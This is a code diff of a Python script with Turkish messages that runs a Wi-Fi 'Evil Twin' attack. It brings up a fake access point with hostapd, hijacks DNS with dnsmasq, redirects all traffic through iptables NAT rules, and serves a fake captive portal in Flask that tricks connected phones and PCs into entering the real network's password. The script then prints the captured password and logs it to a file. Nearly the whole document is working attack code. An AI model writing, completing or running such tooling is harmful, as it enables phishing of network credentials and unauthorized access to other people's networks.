@@ -2,32 +2,24 @@ import os
 import subprocess
 import time
 import threading
-
 def cleanup():
     print("\n    [!] Arkaplan servisleri temizleniyor, ağ kalıntıları onarılıyor...")
-    # DNS, DHCP ve Sahte AP servislerini öldür
     os.system("killall hostapd dnsmasq 2>/dev/null")
     os.system("rm -f /tmp/hostapd.conf /tmp/dnsmasq.conf 2>/dev/null")
-    
-    # Iptables yönlendirmelerini (Captive Portal kalıntılarını) sıfırla
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")
     os.system("iptables -F 2>/dev/null")
     os.system("iptables -t nat -F 2>/dev/null")
-    
-    # İnternet bağlantısını (NetworkManager) tam anlamıyla yeniden kur
     os.system("systemctl start NetworkManager 2>/dev/null")
     os.system("nmcli networking on 2>/dev/null")
-    
     print("    [\033[92m✔\033[0m] Ağ kartınız ve internet bağlantınız orijinal haline getirildi.")
 
+
+# --- CAPTIVE PORTAL (Kimlik Doğrulama Sayfası) ---
 def launch_flask_portal(ssid):
-    # Flask sunucusunu izole bir web servisi gibi başlatır
     portal_code = f"""
 from flask import Flask, request, render_template_string, redirect
 import os
-
 app = Flask(__name__)
-
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="tr">
@@ -59,7 +51,6 @@ HTML_TEMPLATE = '''
 </body>
 </html>
 '''
-
 @app.route("/", defaults={{"path": ""}})
 @app.route("/<path:path>")
 def catch_all(path):
@@ -67,12 +58,10 @@ def catch_all(path):
     user_agent = request.headers.get('User-Agent', '').lower()
     if 'captive' in user_agent or 'apple' in user_agent or 'safari' in user_agent:
         return render_template_string(HTML_TEMPLATE, ssid="{ssid}")
-    
     # If not explicitly captured, redirect to portal page anyway
     if path != "portal":
         return redirect("/portal")
     return render_template_string(HTML_TEMPLATE, ssid="{ssid}")
-
 @app.route("/verify", methods=["POST"])
 def verify():
     pwd = request.form.get("password")
@@ -83,51 +72,37 @@ def verify():
         print(f"\\n\\n[!!!] ŞİFRE YAKALANDI: {{pwd}}\\n")
         return "<h1>Bağlantı Başarılı.</h1><p>Şimdi internete bağlanabilirsiniz. Lütfen bu sayfayı kapatın.</p>"
     return "Hata"
-
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=80, debug=False)
 """
     with open("/tmp/flask_portal.py", "w") as f:
         f.write(portal_code)
-    
     print("    [*] Captive Portal Web Sunucusu (Port 80) Başlatılıyor...")
-    # Port 80 boşta mı kontrol et, çakışma varsa kapat
     os.system("fuser -k 80/tcp >/dev/null 2>&1")
     return subprocess.Popen(["python3", "/tmp/flask_portal.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
+
+# --- ROUGE AP SETUP (Sahte Erişim Noktası) ---
 def start_evil_twin(iface, ssid, channel):
     print(f"\n    [*] {ssid} için Şeytani İkiz (Evil Twin) hazırlanıyor...")
-    
-    # 1. Ortamı temizle
     cleanup()
-    
-    # 2. NetworkManager ve engelleyici servisleri kapat
     os.system("systemctl stop NetworkManager 2>/dev/null")
     os.system("killall wpa_supplicant 2>/dev/null")
     os.system("rfkill unblock wifi")
     time.sleep(1)
-    
-    # Ağ kartını sıfırla ve IP ataması yap
     os.system(f"ifconfig {iface} down")
     os.system(f"iwconfig {iface} mode managed 2>/dev/null")
     os.system(f"ifconfig {iface} 10.0.0.1 netmask 255.255.255.0 up")
-    
-    # 2.5 Iptables Yönlendirmeleri (Tüm trafiği port 80'e at)
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
     os.system("iptables -F")
     os.system("iptables -t nat -F")
     os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80")
     os.system("iptables -t nat -A POSTROUTING -j MASQUERADE")
-    
-    # Kanal 14'ten büyükse (5GHz ağ ise) hostapd 'g' (2.4GHz) modunda çöker. 
-    # Sahte ağ her zaman görünebilmesi için onu zorla Kanal 6'ya ayarlıyoruz.
     try:
         if int(channel) > 14:
             channel = "6"
     except:
         channel = "6"
-
-    # 3. hostapd konfigürasyonu (Fake AP)
     hostapd_conf = f"""interface={iface}
 driver=nl80211
 ssid={ssid}
@@ -139,8 +114,6 @@ ignore_broadcast_ssid=0
 """
     with open("/tmp/hostapd.conf", "w") as f:
         f.write(hostapd_conf)
-
-    # 4. dnsmasq konfigürasyonu (Captive portal DNS hijacking)
     dnsmasq_conf = f"""interface={iface}
 bind-interfaces
 server=8.8.8.8
@@ -153,19 +126,14 @@ address=/#/10.0.0.1
 """
     with open("/tmp/dnsmasq.conf", "w") as f:
         f.write(dnsmasq_conf)
-        
     print("    [*] Fake Erişim Noktası (AP) başlatılıyor...")
     ap_proc = subprocess.Popen(["hostapd", "/tmp/hostapd.conf"], stdout=open("/tmp/hostapd.log", "w"), stderr=subprocess.STDOUT)
     time.sleep(3)
-    
-    # Hostapd başlatılırken hata var mı yok mu detaylı yazdır
     color_yellow = '\033[93m'
     color_end = '\033[0m'
     print(f"\n    {color_yellow}[HOSTAPD BAŞLATMA LOGLARI]{color_end}")
     os.system("head -n 5 /tmp/hostapd.log | awk '{print \"        \" $0}'")
     print(f"    {color_yellow}{'-'*30}{color_end}\n")
-    
-    # Eğer hostapd hemen çöktüyse kullanıcıyı uyar
     if ap_proc.poll() is not None:
         print(f"\n    \033[91m[!] KRİTİK HATA: Sahte Wi-Fi ağı oluşturulamadı!\033[0m")
         print("    [*] Bunun en yaygın iki sebebi şunlardır:")
@@ -175,26 +143,20 @@ address=/#/10.0.0.1
         os.system("cat /tmp/hostapd.log | grep -i error")
         cleanup()
         return
-    
     print("    [*] DNS ve DHCP Yönlendirme Sunucusu başlatılıyor...")
     dns_proc = subprocess.Popen(["dnsmasq", "-C", "/tmp/dnsmasq.conf", "-d"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     time.sleep(2)
-    
-    # 5. Web Portalını Çalıştır
     flask_proc = launch_flask_portal(ssid)
-    os.system("rm -f /tmp/HACKED_CREDS.txt") # Önceki logları sil
-    
+    os.system("rm -f /tmp/HACKED_CREDS.txt") 
     print(f"\n    [\033[92m✔\033[0m] EVIL TWIN AKTİF!")
     print(f"    [*] Ağ Adı: {ssid} başlatıldı.")
     print(f"    [*] Lütfen telefonunuzun Wi-Fi listesini yenileyin, ağ görünecektir.")
     print(f"    [*] Cihazlar (Telefon/PC) tuzağa bağlandığında, Android/iOS otomatik portal pop-up çıkaracaktır.")
     print("    [*] Bekleniyor...")
     print("    [*] (Saldırıyı durdurmak için CTRL+C yapın)")
-    
     try:
         while True:
             time.sleep(1)
-            # Log dosyasında değişiklik varsa ana terminale bas
             if os.path.exists("/tmp/HACKED_CREDS.txt"):
                 with open("/tmp/HACKED_CREDS.txt", "r") as f:
                     content = f.read()
@@ -203,12 +165,9 @@ address=/#/10.0.0.1
                     print(f"\033[93m{content.strip()}\033[0m")
                     print(f"\033[91m{'='*50}\033[0m")
                 os.system("rm -f /tmp/HACKED_CREDS.txt")
-                
-                # Başarılı olunca bir süre daha bekle ve çık
                 print("\n    [*] Kurban sahte ağı terk edebilir. Çıkış yapılıyor...")
                 time.sleep(3)
                 break
-                
     except KeyboardInterrupt:
         print("\n    [!] Saldırı Sonlandırılıyor...")
     finally:
